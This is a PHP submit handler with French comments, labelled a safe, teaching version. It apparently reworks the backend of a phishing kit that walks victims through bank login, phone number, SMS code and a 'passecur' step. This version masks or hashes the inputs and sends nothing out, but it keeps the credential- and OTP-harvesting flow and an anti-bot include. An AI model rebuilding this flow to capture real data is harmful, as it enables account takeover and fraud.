<?php
// submit.php (version pédagogique et sûre)
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

/**
 * Version safe / pédagogique :
 * - Ne renvoie rien à des services externes
 * - Ne sauvegarde pas d'identifiants en clair
 * - Conserve la logique de redirection
 */

// Helpers sûrs (remplaçants si tes includes ne sont pas souhaités ici)
function get_user_ip() {
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}
function get_user_country() {
    return 'XX';
}
function get_user_os() {
    return php_uname('s') . ' ' . php_uname('r');
}
function get_user_browser() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
}
function mask_string($s, $visible_start = 1) {
    $len = strlen($s);
    if ($len <= $visible_start + 2) return str_repeat('*', $len);
    return substr($s, 0, $visible_start) . str_repeat('*', max(3, $len - $visible_start));
}
function safe_write_log($path, $text) {
    if (!is_dir(dirname($path))) mkdir(dirname($path), 0755, true);
    file_put_contents($path, $text . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// Si tu veux quand même inclure tes libs sûres, vérifie leur existence
// include_once '../inc/antibots.php'; // décommenter si sûr
// include_once '../inc/app.php';     // décommenter si sûr

$LSG = substr(md5(rand()), 0, 17);

// Accepter POST (ou GET si tu en as besoin)
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

// Traiter les étapes dans l'ordre attendu

// 1) Login (page1 -> page2)
if ($method === 'POST' && !empty($_POST['user_id']) && !empty($_POST['Hidden1'])) {
    $user_id_raw = (string) $_POST['user_id'];
    $pwd_raw = (string) $_POST['Hidden1'];

    // Stocker uniquement des données non sensibles / masquées
    $_SESSION['user_id_test'] = mask_string($user_id_raw, 2);
    // Hasher le mot de passe *localement* si tu veux l'étudier, mais NE PAS l'exporter
    $_SESSION['user_pwd_hash'] = password_hash($pwd_raw, PASSWORD_DEFAULT);

    // Log pédagogique (masqué)
    $log = sprintf(
        "[TEST LOGIN] %s | user=%s | ip=%s | ua=%s",
        date('c'),
        $_SESSION['user_id_test'],
        get_user_ip(),
        substr(get_user_browser(), 0, 80)
    );
    safe_write_log(__DIR__ . '/../logs/submissions.log', $log);

    header("Location: mobile.php?lsg=" . urlencode($LSG));
    exit();
}

// 2) Téléphone (page2 -> page3)
if ($method === 'POST' && isset($_POST['tel'])) {
    $tel_raw = trim((string) $_POST['tel']);
    if ($tel_raw !== '') {
        // stocker uniquement un masque
        $_SESSION['tel_test'] = mask_string($tel_raw, 2);

        $log = sprintf(
            "[TEST TEL] %s | user=%s | tel=%s | ip=%s",
            date('c'),
            $_SESSION['user_id_test'] ?? 'unknown',
            $_SESSION['tel_test'],
            get_user_ip()
        );
        safe_write_log(__DIR__ . '/../logs/submissions.log', $log);

        header("Location: sms.php?lsg=" . urlencode($LSG));
        exit();
    } else {
        // champ vide -> renvoyer vers mobile.php (page 2)
        header("Location: mobile.php?lsg=" . urlencode($LSG));
        exit();
    }
}

// 3) SMS (page3 -> page4)
if ($method === 'POST' && isset($_POST['sms'])) {
    $sms_raw = trim((string) $_POST['sms']);
    if ($sms_raw !== '') {
        $_SESSION['sms_test'] = mask_string($sms_raw, 1);

        $log = sprintf(
            "[TEST SMS] %s | user=%s | sms=%s | ip=%s",
            date('c'),
            $_SESSION['user_id_test'] ?? 'unknown',
            $_SESSION['sms_test'],
            get_user_ip()
        );
        safe_write_log(__DIR__ . '/../logs/submissions.log', $log);

        header("Location: passecur.php?lsg=" . urlencode($LSG));
        exit();
    } else {
        header("Location: sms.php?lsg=" . urlencode($LSG));
        exit();
    }
}

// Si rien n'est reçu, renvoyer sur index (page 1)
header("Location: index.php?lsg=" . urlencode($LSG));
exit();
